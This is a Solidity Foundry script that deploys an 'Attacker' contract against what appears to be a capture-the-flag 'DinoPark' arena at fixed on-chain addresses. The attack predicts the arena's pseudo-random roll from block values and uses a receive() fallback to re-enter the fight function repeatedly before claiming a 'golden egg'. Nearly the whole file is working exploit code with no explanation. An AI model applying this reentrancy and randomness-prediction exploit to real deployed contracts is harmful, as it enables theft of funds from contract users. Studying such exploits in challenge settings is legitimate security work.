// script/BecomeChampion.s.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Script.sol";

// --- Interfaces needed for the Attacker and Script ---
interface IArena {
    function fight(uint8 guess, uint8 mode) external;
}

interface IDinoPark {
    function claimGoldenEgg() external;
    function arena() external view returns (address);
}

// --- The full Attacker contract ---
contract Attacker {
    IArena public immutable arena;
    IDinoPark public immutable dinoPark;
    uint256 public reentrancyCounter = 0;
    uint8 public luckyRoll;

    constructor(address _arena, address _dinoPark) {
        arena = IArena(_arena);
        dinoPark = IDinoPark(_dinoPark);
    }

    function pwn() external {
        luckyRoll = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 100);
        require(luckyRoll > 30, "Bad roll, try again in the next block.");
        arena.fight(luckyRoll, 0);
    }
    
    function claim() external {
        dinoPark.claimGoldenEgg();
    }

    receive() external payable {
        if (reentrancyCounter < 5) {
            reentrancyCounter++;
            arena.fight(luckyRoll, 0);
        }
    }
}

contract BecomeChampionScript is Script {
    function run() external returns (address) {
        address dinoParkAddr =0x1BBd53E5dE19151C322d26ff8FbffcD2F085381E;
        address arenaAddr =0xAa94A9ec414984cc4009c4A394ab509e26B7cc40;
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        Attacker attacker = new Attacker(arenaAddr, dinoParkAddr);

        // THIS IS THE CRITICAL LINE THAT FIXES THE ERROR
        attacker.pwn{gas: 2_000_000}();
        
        vm.stopBroadcast();
        return address(attacker);
    }
}

